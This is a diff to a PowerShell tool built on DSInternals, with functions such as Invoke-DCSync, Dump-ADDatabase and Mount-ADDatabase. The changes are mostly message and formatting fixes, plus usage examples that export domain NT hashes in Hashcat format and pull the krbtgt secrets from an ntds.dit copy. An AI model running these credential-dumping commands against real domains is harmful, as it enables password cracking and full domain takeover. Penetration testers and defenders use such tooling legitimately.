@@ -46,7 +46,7 @@ function Invoke-DCSync {
 
 	# Check if DSInternals module is installed
 	If(-Not(Get-Module -Name DSInternals -ListAvailable)) {
-		Write-Warning "This command must be launched on a computer with Active Directory PowerShell module installed."
+		Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
 		Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
 		Exit 1
 	} Else {
@@ -229,7 +229,7 @@ function Dump-ADDatabase {
     By default, all domain accounts will be retrieved.
 
 .EXAMPLE
-    PS C:\> Dump-ADDatabase | Format-Custom -View HashcatNT
+    PS C:\> Dump-ADDatabase | Format-Custom -View HashcatNT | Out-File -Encoding ascii ADATUM.hashes
 
 .EXAMPLE
     PS C:\> Dump-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName krbtgt
@@ -250,7 +250,7 @@ function Dump-ADDatabase {
 
 	# Check if DSInternals module is installed
 	If(-Not(Get-Module -Name DSInternals -ListAvailable)) {
-		Write-Warning "This command must be launched on a computer with Active Directory PowerShell module installed."
+		Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
 		Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
 		Exit 1
 	} Else {
@@ -262,7 +262,7 @@ function Dump-ADDatabase {
 	If($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
 		Write-Warning "This command must be launched as an Administrator" 
 		Exit 1
-        }
+    }
 
 	# Read the Boot Key from the SYSTEM registry hive
 	$key = Get-BootKey -SystemHiveFilePath "$SystemHiveFilePath"
@@ -307,7 +307,7 @@ function Mount-ADDatabase {
     PS C:\> Mount-ADDatabase
 
 .EXAMPLE
-    PS C:\> Mount-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -AllowUpgrade 1 -LdapPort 1389
+    PS C:\> Mount-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -AllowUpgrade -LdapPort 1389
 #>
 	Param (
 		[ValidateNotNullOrEmpty()]
